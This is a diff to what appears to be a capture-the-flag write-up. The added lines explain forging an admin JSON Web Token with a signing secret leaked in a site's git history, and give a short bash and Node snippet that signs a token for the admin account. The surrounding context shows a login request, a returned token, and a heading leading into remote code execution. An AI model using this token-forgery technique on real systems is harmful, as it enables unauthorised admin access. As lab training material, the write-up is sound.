@@ -47,7 +47,14 @@ $ curl -H "Content-Type: application/json" -d '{"email":"blaine.bublitz@gmail.co
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTgxNTMzMDdlMDQyMDA0Nzk4OWJhYWUiLCJuYW1lIjoidGVzdGVyIiwiZW1haWwiOiJibGFpbmUuYnVibGl0ekBnbWFpbC5jb20iLCJpYXQiOjE2MzU4NjU5NzZ9.UF6A5i8uOlilGot6_ipbpjkoifzd8KrSmlSKsL_r7tw
 ```
 
-We can now use this auth token for some eploit goodness.
+Knowing this, we need to try to gain access to the admin account. Fortunately, there is the token secret found in the git history in the files you can download from the site. We can use this to generate a token using jwt:
+```bash
+TOKEN_SECRET=secret_from_the_history
+PAYLOAD='{_id:"618153307e0420047989baae",name:"theadmin",email:"root@dasith.works",iat:1635865976}'
+TOKEN=$( node -e "const jwt = require('jsonwebtoken'); console.log(jwt.sign($PAYLOAD, '$TOKEN_SECRET' ));" )
+```
+
+We can now use this auth token for some exploit goodness.
 
 ## Remote Code Execution
 
